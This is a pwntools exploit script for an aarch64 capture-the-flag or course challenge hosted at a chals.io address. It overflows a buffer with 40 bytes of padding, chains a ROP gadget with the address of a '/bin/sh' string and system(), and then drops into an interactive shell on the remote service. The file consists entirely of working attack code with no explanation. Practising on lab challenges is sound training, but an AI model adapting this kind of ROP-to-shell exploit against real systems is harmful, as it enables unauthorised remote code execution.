from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
    break *0x400a40
    continue
    set solib-search-path /usr/aarch64-linux-gnu/lib
'''


def start():
    if args.GDB:
        return process(['qemu-aarch64', '-g', '1234', '-L', '/usr/aarch64-linux-gnu/', binary], level='error')
    elif args.REMOTE:
        return remote("cse4850-aarch64-1.chals.io", 443, ssl=True, sni="cse4850-aarch64-1.chals.io")
    else:
        return process(['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu/', binary], level='error')


p = start()

gadget = p64(0x400854)
binsh = p64(0x401001)


# stage1: sing usna alma mater
payload = cyclic(40)
payload += gadget

# stage2: sing usma alma mater
payload += binsh
payload += binsh
payload += binsh
payload += p64(e.sym["system"])

p.sendline(payload)

p.interactive()
